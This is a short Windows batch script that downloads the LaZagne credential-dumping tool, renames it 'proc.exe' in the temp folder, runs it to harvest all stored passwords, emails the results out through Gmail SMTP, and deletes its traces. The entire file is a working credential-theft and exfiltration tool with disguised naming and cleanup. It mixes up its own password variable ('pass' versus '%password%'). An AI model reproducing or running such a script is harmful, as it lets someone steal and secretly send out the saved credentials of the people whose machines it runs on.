@echo off

:: Setting the variables
set downloadURL=https://192.168.1.1/LaZagne.exe
set email=user@mail.com
set pass=Password123!
set exeFile=%TEMP%\proc.exe
set logFile=%TEMP%\proclog.txt
set args=all

:: Downloading and executing the file, and saving the logs.
powershell (new-object System.Net.WebClient).DownloadFile('%downloadURL%','%exeFile%'); %exeFile% %args% > %logFile%

:: Setting up the mail server (You can choose Google's, smtp2go, sendBlaster 4, or anyother method).
powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%', '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = 'Lazagne report in the attachments.';$ReportEmail.Attachments.Add('%logFile%');$SMTPInfo.Send($ReportEmail);

:: Deleting the files.
del %exeFile%
del %logFile%
